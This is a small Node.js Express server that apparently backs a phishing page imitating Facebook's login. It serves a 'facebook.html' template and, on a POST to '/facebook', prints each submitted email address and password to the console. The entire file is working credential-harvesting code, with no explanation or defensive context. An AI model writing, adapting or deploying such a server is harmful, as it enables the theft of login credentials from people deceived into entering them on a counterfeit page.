var express = require("express");

var app = express();

app.use(express.urlencoded({ extended: false }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/templates/facebook.html");
});

app.post("/facebook", (req, res) => {
  console.log("Email:", req.body.email);
  console.log("Password: ", req.body.password);
  res.end()
});

app.listen(3000, "0.0.0.0", err => {
  if (err) throw err;

  console.log("Server listening on port 3000!");
});
